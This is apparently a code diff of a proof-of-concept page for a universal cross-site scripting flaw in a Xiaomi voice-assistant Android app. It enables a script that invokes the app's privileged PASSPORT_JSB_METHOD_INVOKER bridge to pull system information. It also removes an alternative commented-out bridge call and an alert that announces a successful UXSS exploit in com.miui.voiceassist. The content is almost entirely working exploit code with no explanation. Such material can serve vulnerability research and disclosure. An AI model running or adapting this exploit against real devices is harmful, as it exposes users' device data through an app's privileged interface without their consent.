@@ -8,7 +8,7 @@ document.body.textContent = decodeURIComponent(t);
 </script>
 </body>
 </html> -->
-<!-- <script>
+<script>
   window.PASSPORT_JSB_METHOD_INVOKER.invokeMethod("getSystemInfo", JSON.stringify({"callbackId": "showSystemInfo"}));
   window.showSystemInfo = function(result) {
     var data = JSON.parse(result);
@@ -29,27 +29,4 @@ document.body.textContent = decodeURIComponent(t);
     }
   };
       window.closeDialog = function() {};
-</script> -->
-<!-- <script>
-  // 【关键】必须传空对象 {} 作为参数（Java 端要求 JSONObject，即使未使用）
-  window.PASSPORT_JSB_METHOD_INVOKER.invokeMethod(
-    "getSystemInfo",
-    {}, 
-    function(error, result) { 
-      if (error) {
-        alert("❌ 调用失败:\n" + (error.message || JSON.stringify(error)));
-        return;
-      }
-      let msg = "📱 系统信息详情\n" + "=".repeat(30) + "\n";
-      for (let key in result) {
-        if (result.hasOwnProperty(key)) {
-          msg += `${key.padEnd(22)}: ${result[key]}\n`;
-        }
-      }
-      alert(msg);
-    }
-  );
-</script> -->
-<script>
-  alert('UXSS Exploit Successful via MiuiVoiceAssistActivity! Executing in context of com.miui.voiceassist');
 </script>
